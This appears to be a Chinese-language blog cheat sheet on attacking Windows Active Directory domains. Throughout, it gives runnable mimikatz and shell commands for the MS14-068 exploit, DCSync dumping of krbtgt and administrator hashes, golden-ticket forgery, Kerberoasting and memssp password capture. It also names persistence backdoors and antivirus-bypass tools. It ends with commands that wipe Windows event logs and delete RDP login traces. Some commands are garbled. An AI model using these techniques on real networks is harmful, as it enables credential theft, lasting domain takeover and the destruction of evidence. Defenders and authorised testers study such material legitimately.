域渗透——DNS记录的获取 获取域控的方法 SYSVOL SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。 Sysvol文件夹是安装AD时创建的，它用来存放GPO、Script等信息。同时，存放在Sysvol文件夹中的信息，会复制到域中所有DC上。 相关阅读: 寻找SYSVOL里的密码和攻击GPP（组策略偏好） Windows Server 2008 R2之四管理Sysvol文件夹 SYSVOL中查找密码并利用组策略首选项 利用SYSVOL还原组策略中保存的密码 MS14-068 Kerberos python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机 利用mimikatz将工具得到的TGT_domainuser@SERVER.COM.ccache写入内存，创建缓存证书： mimikatz.exe &quot;kerberos::ptc c:TGT_darthsidious@pentest.com.ccache&quot; exit net use k: \\pentest.comc$ 相关阅读 : Kerberos的工具包PyKEK 深入解读MS14-068漏洞 Kerberos的安全漏洞 SPN扫描 Kerberoast可以作为一个有效的方法从Active Directory中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包。 SPN是服务在使用Kerberos身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用Kerberos身份验证的网络中，必须在内置计算机帐户（如NetworkService或LocalSystem）或用户帐户下为服务器注册SPN。对于内部帐户，SPN将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户的手动注册SPN。 SPN扫描的主要好处是，SPN扫描不需要连接到网络上的每个IP来检查服务端口，SPN通过LDAP查询向域控执行服务发现，SPN查询是Kerberos的票据行为一部分，因此比较难检测SPN扫描。 相关阅读 : 非扫描式的SQL Server发现 SPN扫描 扫描SQLServer的脚本 Kerberos的黄金门票 在域上抓取的哈希 lsadump::dcsync /domain:pentest.com /user:krbtgt kerberos::purge kerberos::golden /admin:administrator /domain:域 /sid:SID /krbtgt:hash值 /ticket:adinistrator.kiribi kerberos::ptt administrator.kiribi kerberos::tgt net use k: \\pnet use k: \\pentest.comc$ 相关阅读 : https://adsecurity.org/?p=1640 域服务账号破解实践 Kerberos的认证原理 深刻理解windows安全认证机制ntlm＆Kerberos Kerberos的银票务 黄金票据和白银票据的一些区别： Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限 银票：伪造TGS，只能访问指定的服务 加密方式不同： Golden Ticket由krbtgt的hash加密 Silver Ticket由服务账号（通常为计算机账户）Hash加密 认证流程不同： 金票在使用的过程需要同域控通信 银票在使用的过程不需要同域控通信 相关阅读 : 攻击者如何使用Kerberos的银票来利用系统 域渗透——Pass The Ticket 域服务账号破解 与上面SPN扫描类似的原理 https://github.com/nidem/kerberoast 获取所有用作SPN的帐户 setspn -T PENTEST.com -Q */* 从Mimikatz的RAM中提取获得的门票 kerberos::list /export 用rgsrepcrack破解 tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi 凭证盗窃 从搜集的密码里面找管理员的密码 NTLM relay One API call away from Domain Admin privexchange Exchange2domain Kerberos委派 Wagging-the-Dog.html s4u2pwnage Attacking Kerberos Delegation 用打印服务获取域控 Computer Takeover Combining NTLM Relaying and Kerberos delegation CVE-2019-1040 地址解析协议 实在搞不定再搞ARP 获取AD哈希 使用VSS卷影副本 Ntdsutil中获取NTDS.DIT文件 PowerShell中提取NTDS.DIT --&gt;Invoke-NinaCopy 使用Mimikatz提取 mimikatz lsadump::lsa /inject exit 使用PowerShell Mimikatz 使用Mimikatz的DCSync 远程转储Active Directory凭证 提取 KRBTGT用户帐户的密码数据： Mimikatz &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:rd.adsecurity.org /user：krbtgt&quot;exit 管理员用户帐户提取密码数据： Mimikatz &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:rd.adsecurity.org /user：Administrator&quot; exit NTDS.dit中提取哈希 使用esedbexport恢复以后使用ntdsxtract提取 AD持久化 活动目录持久性技巧 https://adsecurity.org/?p=1929 DS恢复模式密码维护 DSRM密码同步 Windows Server 2008 需要安装KB961320补丁才支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。KB961320:https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,可参考：巧用DSRM密码同步将域控权限持久化 DCshadow Security Support Provider 简单的理解为SSP就是一个DLL，用来实现身份认证 privilege::debug misc::memssp 这样就不需要重启c:/windows/system32可看到新生成的文件kiwissp.log SID History SID历史记录允许另一个帐户的访问被有效地克隆到另一个帐户 mimikatz &quot;privilege::debug&quot; &quot;misc::addsid bobafett ADSAdministrator&quot; AdminSDHolder＆SDProp 利用AdminSDHolder＆SDProp（重新）获取域管理权限 组策略 https://adsecurity.org/?p=2716 策略对象在持久化及横向渗透中的应用 Hook PasswordChangeNotify http://www.vuln.cn/6812 Kerberoasting后门 域渗透-Kerberoasting AdminSDHolder Backdooring AdminSDHolder for Persistence Delegation Unconstrained Domain Persistence TIPS 《域渗透——Dump Clear-Text Password after KB2871997 installed》 《域渗透——Hook PasswordChangeNotify》 可通过Hook PasswordChangeNotify实时记录域控管理员的新密码 《域渗透——Local Administrator Password Solution》 域渗透时要记得留意域内主机的本地管理员账号 《域渗透——利用SYSVOL还原组策略中保存的密码》 相关工具 BloodHound CrackMapExec DeathStar 利用过程：http://www.freebuf.com/sectool/160884.html 在远程系统上执行程序 At Psexec WMIC Wmiexec Smbexec Powershell remoting DCOM Winrm (https://github.com/Hackplayers/evil-winrm) IOT相关 1、路由器 routersploit 2、打印机 PRET 3、IOT exp https://www.exploitee.rs/ 4、相关 OWASP-Nettacker isf icsmaster 中间人 Cain Ettercap Responder MITMf 3r/MITMf) 规避杀软及检测 Bypass Applocker UltimateAppLockerByPassList https://lolbas-project.github.io/ bypassAV Empire PEspin Shellter Ebowla Veil PowerShell Python 代码注入技术Process Doppelgänging ... 痕迹清理 Windows日志清除 获取日志分类列表： wevtutil el &gt;1.txt 获取单个日志类别的统计信息： eg. wevtutil gli &quot;windows powershell&quot; 回显： creationTime: 2016-11-28T06:01:37.986Z lastAccessTime: 2016-11-28T06:01:37.986Z lastWriteTime: 2017-08-08T08:01:20.979Z fileSize: 1118208 attributes: 32 numberOfLogRecords: 1228 oldestRecordNumber: 1 查看指定日志的具体内容： wevtutil qe /f:text &quot;windows powershell&quot; 删除单个日志类别的所有信息： wevtutil cl &quot;windows powershell&quot; 破坏Windows日志记录功能 利用工具 Invoke-Phant0m Windwos-EventLog-Bypass msf run clearlogs clearev 3389登陆记录清除 @echo off @reg delete &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default&quot; /va /f @del &quot;%USERPROFILE%\\My Documents\\Default.rdp&quot; /a @exit ","link":"https://1oecho.github.io/9Ua5xZkbb/"}]}